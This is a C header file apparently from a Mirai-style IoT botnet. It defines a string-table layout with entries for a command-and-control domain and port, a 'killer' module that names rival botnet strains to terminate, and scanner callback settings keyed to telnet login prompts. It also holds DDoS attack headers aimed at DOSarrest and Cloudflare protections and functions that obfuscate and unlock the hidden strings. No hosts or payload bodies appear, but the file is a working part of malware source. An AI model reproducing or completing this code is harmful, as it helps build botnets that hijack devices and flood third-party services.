#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

#define TABLE_PROCESS_ARGV              1
#define TABLE_EXEC_SUCCESS              2
#define TABLE_CNC_DOMAIN                3
#define TABLE_CNC_PORT                  4               
#define TABLE_KILLER_SAFE               5
#define TABLE_KILLER_PROC               6
#define TABLE_KILLER_EXE                7
#define TABLE_KILLER_DELETED            8
#define TABLE_KILLER_FD                 9
#define TABLE_KILLER_ANIME              10
#define TABLE_KILLER_STATUS             11
#define TABLE_EXEC_MIRAI 12
#define TABLE_EXEC_SORA1 13
#define TABLE_EXEC_SORA2 14
#define TABLE_EXEC_SORA3 15
#define TABLE_EXEC_OWARI 16
#define TABLE_EXEC_OWARI2 17
#define TABLE_EXEC_JOSHO 18
#define TABLE_EXEC_APOLLO 19
#define TABLE_EXEC_STATUS 20
#define TABLE_EXEC_ANIME 21
#define TABLE_EXEC_ROUTE 22
#define TABLE_EXEC_CPUINFO 23
#define TABLE_EXEC_BOGO 24
#define TABLE_EXEC_RC 25
#define TABLE_EXEC_MASUTA1 26
#define TABLE_EXEC_MIRAI1 27
#define TABLE_EXEC_MIRAI2 28
#define TABLE_EXEC_VAMP1 29
#define TABLE_EXEC_VAMP3 30
#define TABLE_EXEC_IRC1 31
#define TABLE_EXEC_QBOT1 32
#define TABLE_EXEC_QBOT2 33
#define TABLE_EXEC_IRC2 34
#define TABLE_EXEC_MIRAI3 35
#define TABLE_EXEC_EXE 36
#define TABLE_EXEC_OMNI 37
#define TABLE_EXEC_LOL 38
#define TABLE_EXEC_SHINTO3 39
#define TABLE_EXEC_SHINTO5 40
#define TABLE_EXEC_JOSHO5 41
#define TABLE_EXEC_JOSHO4 42                 
#define TABLE_SCAN_CB_DOMAIN            43
#define TABLE_SCAN_CB_PORT              44
#define TABLE_SCAN_SHELL                45
#define TABLE_SCAN_ENABLE               46
#define TABLE_SCAN_SYSTEM               47
#define TABLE_SCAN_SH                   48
#define TABLE_SCAN_QUERY                49
#define TABLE_SCAN_RESP                 50
#define TABLE_SCAN_NCORRECT             51
#define TABLE_SCAN_PS                   52
#define TABLE_SCAN_KILL_9               53                   
#define TABLE_ATK_VSE                   54
#define TABLE_ATK_RESOLVER              55
#define TABLE_ATK_NSERV                 56
#define TABLE_ATK_KEEP_ALIVE            57
#define TABLE_ATK_ACCEPT                58
#define TABLE_ATK_ACCEPT_LNG            59
#define TABLE_ATK_CONTENT_TYPE          60
#define TABLE_ATK_SET_COOKIE            61
#define TABLE_ATK_REFRESH_HDR           62
#define TABLE_ATK_LOCATION_HDR          63
#define TABLE_ATK_SET_COOKIE_HDR        64
#define TABLE_ATK_CONTENT_LENGTH_HDR    65
#define TABLE_ATK_TRANSFER_ENCODING_HDR 66
#define TABLE_ATK_CHUNKED               67
#define TABLE_ATK_KEEP_ALIVE_HDR        68
#define TABLE_ATK_CONNECTION_HDR        69
#define TABLE_ATK_DOSARREST             70
#define TABLE_ATK_CLOUDFLARE_NGINX      71
#define TABLE_HTTP_1                  	72
#define TABLE_HTTP_2                  	73
#define TABLE_HTTP_3                	74
#define TABLE_HTTP_4                 	75 
#define TABLE_HTTP_5                 	76
#define TABLE_HTTP_6                 	77
#define TABLE_HTTP_7                 	78
#define TABLE_HTTP_8                 	79
#define TABLE_HTTP_9                 	80
#define TABLE_HTTP_10                 	81
#define TABLE_HTTP_11                 	82
#define TABLE_HTTP_12                 	83
#define TABLE_HTTP_13                 	84
#define TABLE_HTTP_14                 	85
#define TABLE_HTTP_15                 	86
#define TABLE_MISC_WATCHDOG				87
#define TABLE_MISC_WATCHDOG2			88
#define TABLE_SCAN_ASSWORD				89
#define TABLE_SCAN_OGIN					90
#define TABLE_SCAN_ENTER				91
#define TABLE_MISC_RAND					92
#define TABLE_KILLER_DEVNULL			93
#define TABLE_KILLER_COOKIE				94
#define TABLE_KILLER_ASSWORD			95
#define TABLE_KILLER_OGIN				96
#define TABLE_KILLER_ENTER				97
#define TABLE_KILLER_WATCHDOG			98
#define TABLE_KILLER_WATCHDOG2			99
#define TABLE_KILLER_HTTP				100
#define TABLE_KILLER_NETSLINK			101
#define TABLE_KILLER_NVALID				102
#define TABLE_KILLER_SERNAME			103
#define TABLE_KILLER_ENIED				104
#define TABLE_KILLER_BINSH				105

#define TABLE_MAX_KEYS  106

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
